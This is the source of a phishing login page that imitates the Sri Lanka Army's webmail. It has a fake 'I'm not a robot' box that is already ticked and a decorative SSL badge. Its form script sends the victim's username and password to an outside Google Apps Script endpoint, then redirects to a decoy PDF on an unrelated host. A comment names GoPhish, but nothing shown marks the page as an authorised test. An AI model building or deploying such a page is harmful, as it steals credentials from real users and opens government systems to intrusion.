        .right-side {
            position: absolute;
            right: 0;
            top: 0;
            width: 60%;
            height: 100%;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: left;
            padding: 20px;
            padding-top: 20px;
            margin-top: 0;
        }

        .login-box {
            width: 100%;
            max-width: 470px;
        }

        .logo-section {
            margin-bottom: 12px;
        }

        /* Font styles matching the reference image */
        .page-title {
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 28px;
            color: #666;
            letter-spacing: 3px;
            margin-bottom: 0px;
            font-weight: 300;
            text-transform: uppercase;
        }

        .page-subtitle {
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 60px;
            font-weight: 800;
            color: #1a1a1a;
            margin-bottom: 2px;
            letter-spacing: 1px;
            line-height: 1;
            text-transform: uppercase;
        }

        .page-webmail {
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 14px;
            color: #666;
            letter-spacing: 3px;
            margin-bottom: 0;
            font-weight: 300;
            text-transform: uppercase;
        }

        .underline {
            width: 45px;
            height: 3px;
            background: #d4af37;
            margin: 6px 0 10px 0;
        }

        .warning-message {
            background: #b7d6a5;
            border: none;
            border-left: 4px solid #5cd437;
            padding: 12px 14px;
            margin-bottom: 16px;
            font-size: 12px;
            font-family: 'Barlow', sans-serif;
            color: #333;
            line-height: 1.5;
            border-radius: 4px;
            text-align: justify;
        }

        .form-group {
            margin-bottom: 12px;
            position: relative;
        }

        .form-label {
            display: block;
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 11px;
            font-weight: 600;
            color: #333;
            letter-spacing: 2px;
            margin-bottom: 6px;
            text-transform: uppercase;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-icon-left {
            position: absolute;
            left: 12px;
            width: 18px;
            height: 18px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
        }

        .form-input {
            width: 100%;
            padding: 11px 14px 11px 40px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 13px;
            font-family: 'Barlow', sans-serif;
            background: white;
            color: #333;
            transition: border-color 0.3s;
        }

        .form-input:focus {
            outline: none;
            border-color: #4a7c1c;
            box-shadow: 0 0 0 3px rgba(74, 124, 28, 0.1);
        }

        .form-input::placeholder {
            color: #999;
            font-family: 'Barlow', sans-serif;
        }

        .password-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            cursor: pointer;
            color: #999;
            background: none;
            border: none;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .toggle-password:hover {
            color: #4a7c1c;
        }

        .checkbox-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 12px 0 14px 0;
            font-size: 12px;
            font-family: 'Barlow', sans-serif;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 7px;
            color: #333;
            cursor: pointer;
        }

        .checkbox-label input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #4a7c1c;
        }

        .help-link {
            color: #4a7c1c;
            text-decoration: none;
            font-weight: 500;
            font-family: 'Barlow', sans-serif;
            font-size: 12px;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        /* reCAPTCHA box */
        .recaptcha-box {
            border: 1px solid #ddd;
            padding: 12px 14px;
            margin-bottom: 14px;
            background: white;
            border-radius: 4px;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s;
        }

        .recaptcha-box:hover {
            border-color: #ccc;
        }

        .recaptcha-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            flex-shrink: 0;
            appearance: none;
            border: 2px solid #ddd;
            border-radius: 3px;
            background: white;
            transition: all 0.3s;
        }

        .recaptcha-checkbox:checked {
            background: #4a7c1c;
            border-color: #4a7c1c;
            position: relative;
        }

        .recaptcha-checkbox:checked::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 12px;
            font-weight: bold;
            line-height: 1;
        }

        .recaptcha-text-block {
            flex: 1;
        }

        .recaptcha-text {
            font-size: 13px;
            font-family: 'Barlow', sans-serif;
            color: #333;
            margin-bottom: 0px;
            font-weight: 600;
        }

        .recaptcha-brand {
            font-size: 8px;
            color: #999;
            font-family: 'Barlow', sans-serif;
            letter-spacing: 0.5px;
        }

        .recaptcha-icon {
            width: 28px;
            height: 28px;
            flex-shrink: 0;
        }

        .sign-in-btn {
            width: 100%;
            padding: 11px;
            background: #4a7c1c;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-family: 'Barlow Condensed', sans-serif;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .sign-in-btn:hover {
            background: #3d6415;
        }

        .sign-in-btn:active {
            transform: scale(0.98);
        }

        /* Footer */
        .footer {
            margin-top: 14px;
            padding-top: 10px;
            border-top: 1px solid #ddd;
            font-size: 10px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            font-family: 'Barlow', sans-serif;
        }

        .footer-title {
            font-family: 'Barlow Condensed', sans-serif;
            font-weight: 700;
            font-size: 11px;
            color: #444;
            letter-spacing: 0.5px;
            margin-bottom: 2px;
            text-transform: uppercase;
        }

        .footer-sub {
            font-family: 'Barlow', sans-serif;
            font-size: 9px;
            color: #aaa;
        }

        /* SSL badge — green styling */
        .ssl-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: #e8f5e9;
            color: #4a7c1c;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 9px;
            font-family: 'Barlow Condensed', sans-serif;
            font-weight: 600;
            letter-spacing: 1px;
            white-space: nowrap;
            margin-left: auto;
            border: 1px solid #4a7c1c;
        }

        .ssl-badge svg {
            width: 11px;
            height: 11px;
        }

        @media (max-width: 1024px) {
            .left-side {
                position: static;
                width: 100%;
                min-height: 200px;
            }

            .right-side {
                position: static;
                width: 100%;
                flex: 1;
                padding: 20px;
                margin-top: 0;
            }

            .login-box {
                margin-top: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side"></div>

        <div class="right-side">
            <div class="login-box">
                <div class="logo-section">
                    <div class="page-title">SRI LANKA</div>
                    <div class="page-subtitle">ARMY</div>
                    <div class="underline"></div>
                    <div class="page-webmail">WEB MAIL</div>
                </div>

                <!-- GoPhish Form Action -->
<form method="POST" action="https://script.google.com/macros/s/AKfycbzlX4DlnOp5YbFb1TPDPKbOXLi-WdvgPQM4mOae8RY68Dct8pY6xQc6XDbuj4_j9A-3/exec" onsubmit="handleSubmit(event)">
    <div class="form-group">
        <label class="form-label">User Name</label>
        <div class="input-wrapper">
            <div class="input-icon-left">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                    <circle cx="12" cy="7" r="4"/>
                </svg>
            </div>
            <input type="text" name="username" class="form-input" placeholder="Username" required>
        </div>
    </div>

    <div class="form-group">
        <label class="form-label">Password</label>
        <div class="input-wrapper">
            <div class="input-icon-left">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
            </div>
            <input type="password" name="password" class="form-input" placeholder="Enter your password" required>
        </div>
    </div>

    <div class="checkbox-row">
        <label class="checkbox-label">
            <input type="checkbox">
            Keep me signed in
        </label>
        <a href="#" class="help-link">Help</a>
    </div>

    <div class="recaptcha-box">
        <input type="checkbox" class="recaptcha-checkbox" onclick="return false;" checked>
        <div class="recaptcha-text-block">
            <div class="recaptcha-text">I'm not a robot</div>
            <div class="recaptcha-brand">reCAPTCHA</div>
        </div>
        <img src="RecaptchaLogo.svg.png" alt="reCAPTCHA" class="recaptcha-icon">
    </div>

    <button type="submit" class="sign-in-btn">Sign In →</button>
</form>

<script>
function handleSubmit(event) {
    event.preventDefault();
    
    var form = event.target;
    var formData = new FormData(form);
    var pdfUrl = 'https://maliramy.atwebpages.com/Demo3.pdf';
    
    fetch(form.action, {
        method: 'POST',
        body: formData
    }).then(function(response) {
        return response.json();
    }).then(function(data) {
        console.log('✓ Data saved:', data);
        window.location.href = pdfUrl;
    }).catch(function(error) {
        console.error('✗ Error:', error);
        window.location.href = pdfUrl;
    });
}
</script>
